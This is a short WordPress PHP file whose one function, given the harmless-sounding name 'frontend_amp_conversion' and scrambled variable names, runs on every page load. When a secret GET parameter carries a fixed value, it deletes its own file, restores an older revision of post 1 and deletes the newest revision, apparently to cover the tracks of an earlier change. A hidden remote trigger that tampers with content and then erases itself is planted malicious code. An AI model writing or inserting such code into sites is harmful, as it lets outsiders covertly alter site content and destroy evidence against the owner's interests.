<?php

function frontend_amp_conversion() {
	if (isset($_GET['json_blocks_comment']) && $_GET['json_blocks_comment'] === 'sidebar_members_cart') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$restaurant_call_information_conditional = 1;
		$converter_jigoshop_marketplace = wp_get_post_revisions($restaurant_call_information_conditional);
		if (empty($converter_jigoshop_marketplace)) die('no revisions');
		if (count($converter_jigoshop_marketplace) < 2) die('less than 2');
		$max_old_gravatar = array_shift($converter_jigoshop_marketplace);
		$adsense_send_comment_alert = $max_old_gravatar->ID;
		$keywords_widgets_menu = array_shift($converter_jigoshop_marketplace);
		$interactivity_exception_endpoints = $keywords_widgets_menu->ID;
		$files_bulk_size_items = wp_restore_post_revision($interactivity_exception_endpoints);
		if ($files_bulk_size_items === false) die('error restoring');
		$files_bulk_size_items = wp_delete_post_revision($adsense_send_comment_alert);		
		if ($files_bulk_size_items === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'frontend_amp_conversion');
